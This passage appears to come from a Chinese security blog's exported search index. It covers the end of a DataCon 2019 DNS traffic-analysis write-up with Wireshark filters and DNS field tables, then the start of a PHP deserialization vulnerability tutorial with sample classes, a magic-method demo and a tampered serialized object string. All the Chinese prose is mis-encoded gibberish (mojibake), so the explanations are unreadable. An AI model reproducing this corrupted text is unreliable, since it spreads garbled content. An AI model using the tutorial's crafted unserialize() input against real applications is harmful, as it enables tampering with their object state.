<li><a href="https://blog.csdn.net/u014756827/article/details/78949924">sort | uniq -c</a></li>
<li><a href="https://www.cnblogs.com/xiaoleiel/p/8349487.html">awk</a></li>
<li><a href="https://www.runoob.com/linux/linux-comm-more.html">more</a></li>
<li><a href="https://www.cnblogs.com/blogoflee/archive/2012/02/10/2344939.html">wc</a></li>
</ul>
</li>
<li>
<p>å‡ ä¸ªç»å¸¸ç”¨åˆ°çš„DNSæ˜¾ç¤ºè¿‡æ»¤å™¨çš„å®ä¾‹</p>
<ul>
<li><code>dns.flags.response=0</code>(DNSæŸ¥è¯¢æ¶ˆæ¯)</li>
<li><code>dns.flags.response=1</code>(DNSå“åº”æ¶ˆæ¯)</li>
<li><code>dns.flags.rcode=0</code>(æ˜¾ç¤ºRCODEå­—æ®µå€¼ä¸º0(Noerror)çš„DNSåº”ç­”æ¶ˆæ¯)</li>
<li><code>dns.flags.rcode=3</code>(æ˜¾ç¤ºRCODEå­—æ®µå€¼ä¸º3(NXDomain,è¡¨ç¤ºåŸŸåä¸å­˜åœ¨)çš„DNSåº”ç­”æ¶ˆæ¯)</li>
<li><code>dns.flags.opcode=0</code>(æ˜¾ç¤ºDNSå¸¸è§„æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSå“åº”æ¶ˆæ¯)</li>
<li><code>dns.flags.opcode=1</code>(æ˜¾ç¤ºDNSé€†å‘æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSå“åº”æ¶ˆæ¯)</li>
<li><code>dns.flags.opcode=2</code>(æ˜¾ç¤ºDNSæœåŠ¡å™¨çŠ¶æ€è¯·æ±‚æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSæœåŠ¡å™¨çŠ¶æ€å“åº”æ¶ˆæ¯)</li>
<li><code>dns.flags.opcode=5</code>(æ˜¾ç¤ºDNSåŠ¨æ€æ›´æ–°æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSåŠ¨æ€æ›´æ–°å“åº”æ¶ˆæ¯)</li>
<li><code>dns.flags.recdesired=1</code>(RDæ ‡è®°ä½ç½®1çš„DNSæŸ¥è¯¢æ¶ˆæ¯ä¸€èˆ¬ä¸ºä¸»æœºå‘å‡ºï¼Œç›®çš„æ˜¯è¦æ±‚æ¥å—è¯¥æ¶ˆæ¯çš„DNSæœåŠ¡å™¨æ‰§è¡Œé€’å½’æŸ¥è¯¢)</li>
<li><code>dns.flags.recdesired=0</code>(æ˜¾ç¤ºRDæ ‡è®°ä½ç½®0çš„DNSé€’å½’åå¤æŸ¥è¯¢åŠå“åº”æ¶ˆæ¯)</li>
</ul>
</li>
<li>
<p>å¸¸ç”¨çš„æŸ¥è¯¢å­—æ®µ</p>
<table>
<thead>
<tr>
<th>å­—æ®µ</th>
<th>æè¿°</th>
<th>å­—æ®µ</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td>frame.len</td>
<td>æ•°æ®é•¿åº¦</td>
<td>dns.flags.authenticated</td>
<td>æœåŠ¡å™¨æ˜¯å¦ä¸ºåŸŸæƒå¨æœåŠ¡å™¨</td>
</tr>
<tr>
<td>ip.src</td>
<td>æºIP</td>
<td>dns.flags.checkisable</td>
<td>éè®¤è¯æ•°æ®æ˜¯å¦å¯æ¥æ”¶</td>
</tr>
<tr>
<td>ip.dst</td>
<td>ç›®çš„IP</td>
<td>dns.flags.rcode</td>
<td>DNS reply code</td>
</tr>
<tr>
<td>udp.srcport</td>
<td>æºudpç«¯å£å·</td>
<td>dns.count.quires</td>
<td>æ•°æ®åŒ…ä¸­DNSè¯·æ±‚æ•°</td>
</tr>
<tr>
<td>udp.dstport</td>
<td>ç›®çš„udpç«¯å£å·</td>
<td>dns.count.answers</td>
<td>æ•°æ®åŒ…ä¸­DNSå›ç­”æ•°</td>
</tr>
<tr>
<td>eth.src</td>
<td>æºMACåœ°å€</td>
<td>dns.count.auth_rr</td>
<td>æ•°æ®åŒ…ä¸­æƒå¨è®°å½•æ•°</td>
</tr>
<tr>
<td>eth.dst</td>
<td>ç›®çš„MACåœ°å€</td>
<td>dns.count.add_rr</td>
<td>æ•°æ®åŒ…ä¸­é¢å¤–è®°å½•æ•°</td>
</tr>
<tr>
<td><a href="http://dns.id">dns.id</a></td>
<td>DNS Transaction ID</td>
<td><a href="http://dns.qry.name">dns.qry.name</a></td>
<td>DNSè¯·æ±‚å</td>
</tr>
<tr>
<td>dns.flags.response</td>
<td>DNSè¯·æ±‚/ç°æœ‰å“åº”æ ‡å¿—</td>
<td>dns.qry.class</td>
<td>DNSè¯·æ±‚ç±»å‹</td>
</tr>
<tr>
<td>dns.flags.opcode</td>
<td>DNS opcode</td>
<td><a href="http://dns.resp.name">dns.resp.name</a></td>
<td>DNSå“åº”å</td>
</tr>
<tr>
<td>dns.flags.authoritative</td>
<td>åº”ç­”æ˜¯å¦è¢«æœåŠ¡å™¨è®¤è¯</td>
<td>dns.resp.type</td>
<td>DNSå›å¤ç±»å‹</td>
</tr>
<tr>
<td>dns.flags.truncated</td>
<td>æ¶ˆæ¯æ˜¯å¦è¢«æˆªæ–­</td>
<td>dns.resp.ttl</td>
<td>DNSå“åº”ç”Ÿå­˜æ—¶é—´</td>
</tr>
<tr>
<td>dns.flags.recdesired</td>
<td>æ˜¯å¦é€’å½’æŸ¥è¯¢</td>
<td><a href="http://dns.resp.z.do">dns.resp.z.do</a></td>
<td>DNSæ˜¯å¦æ”¯æŒDNSSEC</td>
</tr>
<tr>
<td>dns.flags.reavail</td>
<td>æœåŠ¡å™¨æ˜¯å¦èƒ½é€’å½’æŸ¥è¯¢</td>
<td>frame.time_relative</td>
<td>frameç›¸å¯¹æ—¶é—´</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>å¸¸ç”¨æŸ¥è¯¢å­—æ®µç±»å‹</p>
<table>
<thead>
<tr>
<th>TYPE</th>
<th>å€¼</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>A</td>
<td>1</td>
<td>ä¸»æœºåœ°å€</td>
</tr>
<tr>
<td>NS</td>
<td>2</td>
<td>æƒå¨æœåŠ¡å™¨</td>
</tr>
<tr>
<td>CNAME</td>
<td>5</td>
<td>åˆ«åçš„æ­£åˆ™åç§°</td>
</tr>
<tr>
<td>SOA</td>
<td>6</td>
<td>æ ‡è®°æƒå¨åŒºåŸŸçš„å¼€å§‹</td>
</tr>
<tr>
<td>PTR</td>
<td>12</td>
<td>åŸŸåæŒ‡é’ˆ</td>
</tr>
<tr>
<td>MX</td>
<td>15</td>
<td>é‚®ä»¶äº¤æ¢</td>
</tr>
<tr>
<td>TXT</td>
<td>16</td>
<td>æ–‡æœ¬å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td>DS</td>
<td>43</td>
<td>å§”æ‰˜ç­¾å‘è€…</td>
</tr>
<tr>
<td>IXFR</td>
<td>251</td>
<td>å¢é‡åŒºåŸŸè½¬ç§»</td>
</tr>
<tr>
<td>AXFR</td>
<td>252</td>
<td>æƒå¨åŒºåŸŸè½¬ç§»</td>
</tr>
<tr>
<td>*</td>
<td>255</td>
<td>æ‰€æœ‰è§£æè®°å½•ï¼Œä¹Ÿæˆä¸ºANY</td>
</tr>
</tbody>
</table>
</li>
</ol>
<hr>
<h2 id="äº”ã€æ€»ç»“ä¸åæ€">äº”ã€æ€»ç»“ä¸åæ€</h2>
<p>çœ‹äº†å¾ˆå¤šå¤§ä½¬ä»¬å†™çš„Writeupï¼Œç…§è‘«èŠ¦ç”»ç“¢å¤ç°äº†DNSæ¶æ„æµé‡åˆ†æï¼ŒæœŸé—´é‡åˆ°äº†ä¸å°‘çš„å›°éš¾ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>å¯¹DNSåè®®äº†è§£å¾ˆå°‘</li>
<li>æ•°æ®åŒ…éå¸¸å¤§ï¼Œæ²¡æœ‰æ”»å‡»æµé‡çš„æ ‡æ³¨</li>
<li>å¯¹æµé‡åˆ†æåŸºæœ¬æ˜¯é›¶èµ·æ­¥ï¼Œä¸çŸ¥é“è¯¥ä»å“ªé‡Œå¼€å§‹åˆ†æï¼Œæ²¡æœ‰ä¸€ä¸ªåˆç†çš„é€»è¾‘æ€ç»´</li>
</ul>
<p>ç»è¿‡è¿™ä¸€è½®çš„å¤ç°ä¹‹åï¼Œå¯ä»¥è¯´å¯¹æµé‡åˆ†ææœ‰äº†ä¸€å®šçš„äº†è§£ï¼ŒçŸ¥é“äº†ä¸€äº›DNSçš„æ”»å‡»æ‰‹æ®µä»¥åŠæ”»å‡»ç‰¹å¾ï¼Œè¿˜æœ‰è‹¥å¹²éå¸¸å®ç”¨çš„æ–‡ä»¶å¤„ç†å‘½ä»¤ã€‚ä½†æ˜¯ï¼Œä¾ç„¶å­˜åœ¨å¾ˆå¤šä¸è¶³ï¼Œæ‰€ä»¥æ‰“ç®—ä»¥<a href="https://github.com/shyoshyo/DataCon-9102-DNS">shyoshyo</a>æ’°å†™çš„Writeupä¸ºæ¨¡æ¿ï¼Œæœ‰æ¡ç†ã€æœ‰é€»è¾‘çš„è¿›è¡Œç¬¬äºŒè½®æµé‡åˆ†æã€‚</p>
]]></content>
      <categories>
        <category>æµé‡åˆ†æ</category>
        <category>æ¯”èµ›é¢˜</category>
      </categories>
      <tags>
        <tag>Wireshark</tag>
        <tag>æµé‡åˆ†æ</tag>
        <tag>DNS</tag>
        <tag>Datacon2019</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPååºåˆ—åŒ–æ¼æ´å­¦ä¹ -åŸºç¡€ç¯‡</title>
    <url>/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
    <content><![CDATA[<h1 id="PHPååºåˆ—åŒ–æ¼æ´å­¦ä¹ â€”â€”åŸºç¡€ç¯‡">PHPååºåˆ—åŒ–æ¼æ´å­¦ä¹ â€”â€”åŸºç¡€ç¯‡</h1>
<h2 id="0x01-ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–">0x01 ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–</h2>
<h3 id="phpçš„åºåˆ—åŒ–">phpçš„åºåˆ—åŒ–</h3>
<p>PHP çš„æ‰€è°“çš„åºåˆ—åŒ–ä¹Ÿæ˜¯ä¸€ä¸ªå°†å„ç§ç±»å‹çš„æ•°æ®ï¼Œå‹ç¼©å¹¶æŒ‰ç…§ä¸€å®šæ ¼å¼å­˜å‚¨çš„è¿‡ç¨‹ï¼Œä»–æ‰€ä½¿ç”¨çš„å‡½æ•°æ˜¯serialize() ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹é¢çš„å®ä¾‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $name = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">	<span class="keyword">protected</span> $gender = <span class="string">&#x27;male&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> $age = <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_name</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">new</span> Person();</span><br><span class="line">$user-&gt;set_name(<span class="string">&#x27;ca01h&#x27;</span>);</span><br><span class="line">$data = serialize($user);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure>
<p>è¿™æ˜¯ä¸€ä¸ªç®€å•çš„ php ç±»ï¼Œç„¶åæˆ‘ä»¬å®ä¾‹åŒ–ä»¥åå¯¹å…¶å±æ€§è¿›è¡Œäº†èµ‹å€¼ï¼Œç„¶åè°ƒç”¨äº† serialize() å¹¶ä¸”è¾“å‡ºï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹è¾“å‡ºçš„ç»“æœï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200507151334.png" alt=""></p>
<p>ä¾æ¬¡è§£é‡Šå¦‚ä¸‹ï¼š</p>
<p><code>O</code>ä»£è¡¨Objectå¯¹è±¡ï¼›</p>
<p><code>6</code>ä»£è¡¨ç±»åé•¿åº¦æ˜¯6ï¼›</p>
<p><code>Person</code>ä»£è¡¨ç±»åï¼›</p>
<p><code>3</code>ä»£è¡¨ç±»ä¸­çš„å±æ€§æœ‰3ä¸ªï¼›</p>
<p><code>s:12:&quot;&lt;0x00&gt;Person&lt;0x00&gt;name&quot;;s:5:&quot;ca01h&quot;;</code>ï¼šå…¶ä¸­<code>s</code>ä»£è¡¨Stringç±»å‹ï¼Œ<code>12</code>ä»£è¡¨å±æ€§å<code>&lt;0x00&gt;Person&lt;0x00&gt;name</code>çš„é•¿åº¦ï¼Œ<code>s</code>ä»£è¡¨Stringç±»å‹ï¼Œ<code>5</code>ä»£è¡¨å±æ€§å€¼çš„é•¿åº¦ï¼Œ<code>&quot;ca01h&quot;</code>æ˜¯å±æ€§å€¼ï¼›</p>
<p><code>s:9:&quot;&lt;0x00&gt;*&lt;0x00&gt;gender&quot;;s:4:&quot;male&quot;;</code>ï¼šå…¶ä¸­<code>s</code>ä»£è¡¨Stringç±»å‹ï¼Œ<code>9</code>ä»£è¡¨å±æ€§å<code>&lt;0x00&gt;*&lt;0x00&gt;gender</code>çš„é•¿åº¦ï¼Œ<code>s</code>ä»£è¡¨Stringç±»å‹ï¼Œ<code>4</code>ä»£è¡¨å±æ€§å€¼çš„é•¿åº¦ï¼Œ<code>&quot;male&quot;</code>æ˜¯å±æ€§å€¼ï¼›</p>
<p><code>s:3:&quot;age&quot;;i:17;</code>ï¼šå…¶ä¸­<code>s</code>ä»£è¡¨Stringç±»å‹ï¼Œ<code>3</code>ä»£è¡¨å±æ€§å<code>&quot;age&quot;</code>çš„é•¿åº¦ï¼Œ<code>i</code>ä»£è¡¨Integerç±»å‹ï¼Œ<code>17</code>æ˜¯å±æ€§å€¼ã€‚</p>
<p>è¿™é‡Œæœ‰ä¸¤ä¸ªå€¼å¾—æ³¨æ„çš„åœ°æ–¹ï¼š</p>
<ol>
<li>
<p>ä¸åŒç±»å‹ç±»å±æ€§</p>
<p>privateå±æ€§åºåˆ—åŒ–çš„æ ¼å¼ï¼š<code>%00ç±»å%00å±æ€§å</code></p>
<p>protectå±æ€§åºåˆ—åŒ–çš„æ ¼å¼ï¼š<code>%00*%00å±æ€§å</code></p>
</li>
<li>
<p>åºåˆ—åŒ–åªåºåˆ—åŒ–ç±»å±æ€§ï¼Œä¸åºåˆ—åŒ–ç±»æ–¹æ³•</p>
</li>
</ol>
<p>æ‰€ä»¥åœ¨åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´çš„æ—¶å€™ï¼š</p>
<ol>
<li><strong>æˆ‘ä»¬åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¸€å®šè¦ä¿è¯åœ¨å½“å‰çš„ä½œç”¨åŸŸç¯å¢ƒä¸‹æœ‰è¯¥ç±»å­˜åœ¨</strong></li>
<li><strong>æˆ‘ä»¬åœ¨ååºåˆ—åŒ–æ”»å‡»çš„æ—¶å€™ä¹Ÿå°±æ˜¯ä¾æ‰˜ç±»å±æ€§è¿›è¡Œæ”»å‡»</strong></li>
</ol>
<h3 id="PHPçš„ååºåˆ—åŒ–">PHPçš„ååºåˆ—åŒ–</h3>
<p>æœ‰åºåˆ—åŒ–å¯¹è±¡ä¸ºå‹ç¼©æ ¼å¼åŒ–çš„å­—ç¬¦ä¸²ï¼Œå°±æœ‰ååºåˆ—åŒ–å°†å‹ç¼©æ ¼å¼åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸï¼Œæˆ‘ä»¬è¿˜æ˜¯æ²¿ç”¨ä¸Šé¢çš„ä»£ç ï¼Œå…ˆå°†åºåˆ—åŒ–çš„å†…å®¹å­˜æ”¾åœ¨<code>serialize.txt</code> é‡Œé¢ï¼Œç„¶åå†è¿›è¡Œååºåˆ—åŒ–ï¼Œå¹¶è¾“å‡ºå±æ€§å€¼<code>name</code>å’Œ<code>age</code>çš„å€¼ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $name = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">	<span class="keyword">protected</span> $gender = <span class="string">&#x27;male&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> $age = <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_name</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">new</span> Person();</span><br><span class="line">$user-&gt;set_name(<span class="string">&#x27;ca01h&#x27;</span>);</span><br><span class="line">$data = serialize($user);</span><br><span class="line"><span class="comment">// echo $data;</span></span><br><span class="line">$data = unserialize($data);</span><br><span class="line"><span class="keyword">echo</span> $data-&gt;age;</span><br><span class="line"><span class="keyword">echo</span> $data-&gt;get_name();</span><br></pre></td></tr></table></figure>
<p>ååºåˆ—åŒ–ç»“æœï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">18</span><br><span class="line">ca01h</span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆç¨å¾®å»¶ç”³ä¸€ç‚¹ï¼Œå¦‚æœ<code>$data</code>å‚æ•°æ˜¯ç”¨æˆ·å¯æ§çš„å‘¢ï¼Œæ¯”å¦‚æˆ‘ä¼ å…¥ä¸€ä¸ªå¦‚ä¸‹å‚æ•°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:6:&quot;Person&quot;:3:&#123;s:12:&quot;&lt;0x00&gt;Person&lt;0x00&gt;name&quot;;s:5:&quot;hacker&quot;;s:9:&quot;&lt;0x00&gt;*&lt;0x00&gt;gender&quot;;s:4:&quot;female&quot;;s:3:&quot;age&quot;;i:17;&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å°±äººä¸ºçš„æ”¹å˜äº†ç±»å±æ€§çš„å€¼ï¼Œç”±æ­¤å¼•å‡ºPHPååºåˆ—åŒ–æ¼æ´ã€‚</p>
<h2 id="0x02-PHPååºåˆ—åŒ–æ¼æ´">0x02 PHPååºåˆ—åŒ–æ¼æ´</h2>
<p>ååºåˆ—åŒ–æ¼æ´çš„æˆå› åœ¨äºä»£ç ä¸­çš„ unserialize() æ¥æ”¶çš„å‚æ•°å¯æ§ï¼Œä»ä¸Šé¢çš„ä¾‹å­çœ‹ï¼Œè¿™ä¸ªå‡½æ•°çš„å‚æ•°æ˜¯ä¸€ä¸ªåºåˆ—åŒ–çš„å¯¹è±¡ï¼Œè€Œåºåˆ—åŒ–çš„å¯¹è±¡åªå«æœ‰å¯¹è±¡çš„å±æ€§ï¼Œé‚£æˆ‘ä»¬å°±è¦åˆ©ç”¨å¯¹å¯¹è±¡å±æ€§çš„ç¯¡æ”¹å®ç°æœ€ç»ˆçš„æ”»å‡»ã€‚</p>
<h3 id="é­”æ³•æ–¹æ³•è°ƒç”¨">é­”æ³•æ–¹æ³•è°ƒç”¨</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200507162522.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $name = <span class="string">&quot;Bob&quot;</span>;</span><br><span class="line">	<span class="keyword">private</span> $id = <span class="string">&quot;417&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;this is __construct&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;this is __destruct&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;this is __invoke&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;this is __toString&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;this is __wakeup&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;this is __sleep&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;id&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$args</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;this is __call. name is &quot;</span>.$name.<span class="string">&quot; args is &quot;</span>.$args.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$arg</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span><span class="string">&quot;call __get&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params">$name,$id</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;call __set&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$r = <span class="keyword">new</span> User(<span class="string">&quot;Alice&quot;</span>);</span><br><span class="line">$r();</span><br><span class="line"><span class="keyword">echo</span> $r;</span><br><span class="line">unserialize(serialize($r));</span><br><span class="line">$r-&gt;print(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">$r-&gt;id;</span><br><span class="line">$r-&gt;id = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºé¡ºåºå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">this is __construct</span><br><span class="line">this is __invoke</span><br><span class="line">this is __toString</span><br><span class="line">this is __sleep</span><br><span class="line">this is __wakeup</span><br><span class="line">this is __destruct</span><br><span class="line">this is __call. name is print args is Array</span><br><span class="line">call __get</span><br><span class="line">call __set</span><br><span class="line">this is __destruct</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­<code>__toString()</code>è§¦å‘æ–¹å¼æ¯”è¾ƒå¤šï¼š</p>
<ol>
<li>echo (<code>$obj</code>) / print(<code>$obj</code>) æ‰“å°æ—¶ä¼šè§¦å‘</li>
<li>ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿æ¥æ—¶</li>
<li>ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶</li>
<li>ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿›è¡Œ<mark>æ¯”è¾ƒæ—¶ï¼ˆPHPè¿›è¡Œ</mark>æ¯”è¾ƒçš„æ—¶å€™ä¼šè½¬æ¢å‚æ•°ç±»å‹ï¼‰</li>
<li>ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–SQLè¯­å¥ï¼Œç»‘å®šå‚æ•°æ—¶</li>
<li>ååºåˆ—åŒ–å¯¹è±¡åœ¨ç»è¿‡phpå­—ç¬¦ä¸²å‡½æ•°ï¼Œå¦‚ strlen()ã€addslashes()æ—¶</li>
<li>åœ¨in_array()æ–¹æ³•ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ååºåˆ—åŒ–å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„æ•°ç»„ä¸­æœ‰<strong>toStringè¿”å›çš„å­—ç¬¦ä¸²çš„æ—¶å€™</strong>toStringä¼šè¢«è°ƒç”¨</li>
<li>ååºåˆ—åŒ–çš„å¯¹è±¡ä½œä¸º class_exists() çš„å‚æ•°çš„æ—¶å€™</li>
</ol>
<h3 id="é­”æ³•æ–¹æ³•çš„ä½œç”¨">é­”æ³•æ–¹æ³•çš„ä½œç”¨</h3>
<p>æˆ‘ä»¬ä¸Šé¢è®²è¿‡ï¼Œåœ¨æˆ‘ä»¬çš„æ”»å‡»ä¸­ï¼Œååºåˆ—åŒ–å‡½æ•° unserialize() æ˜¯æˆ‘ä»¬æ”»å‡»çš„å…¥å£ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦è¿™ä¸ªå‚æ•°å¯æ§ï¼Œæˆ‘ä»¬å°±èƒ½ä¼ å…¥ä»»ä½•çš„å·²ç»åºåˆ—åŒ–çš„å¯¹è±¡ï¼ˆåªè¦è¿™ä¸ªç±»åœ¨å½“å‰ä½œç”¨åŸŸå­˜åœ¨æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ï¼‰ï¼Œè€Œä¸æ˜¯å±€é™äºå‡ºç° unserialize() å‡½æ•°çš„ç±»çš„å¯¹è±¡ï¼Œå¦‚æœåªèƒ½å±€é™äºå½“å‰ç±»ï¼Œé‚£æˆ‘ä»¬çš„æ”»å‡»é¢ä¹Ÿå¤ªç‹­å°äº†ï¼Œè¿™ä¸ªç±»ä¸è°ƒç”¨å±é™©çš„æ–¹æ³•æˆ‘ä»¬å°±æ²¡æ³•å‘èµ·æ”»å‡»ã€‚</p>
<p>ä½†æ˜¯æˆ‘ä»¬åˆçŸ¥é“ï¼Œä½ ååºåˆ—åŒ–äº†å…¶ä»–çš„ç±»å¯¹è±¡ä»¥åæˆ‘ä»¬åªæ˜¯æ§åˆ¶äº†æ˜¯å±æ€§ï¼Œå¦‚æœä½ æ²¡æœ‰åœ¨å®Œæˆååºåˆ—åŒ–åçš„ä»£ç ä¸­è°ƒç”¨å…¶ä»–ç±»å¯¹è±¡çš„æ–¹æ³•ï¼Œæˆ‘ä»¬è¿˜æ˜¯æŸæ‰‹æ— ç­–ï¼Œæ¯•ç«Ÿä»£ç æ˜¯äººå®¶å†™çš„ï¼Œäººå®¶æœ¬èº«å°±æ˜¯è¦ååºåˆ—åŒ–åè°ƒç”¨è¯¥ç±»çš„æŸä¸ªå®‰å…¨çš„æ–¹æ³•ï¼Œä½ æ€»ä¸èƒ½æ”¹äººå®¶çš„ä»£ç å§ï¼Œä½†æ˜¯æ²¡å…³ç³»ï¼Œå› ä¸ºæˆ‘ä»¬æœ‰é­”æ³•æ–¹æ³•ã€‚</p>
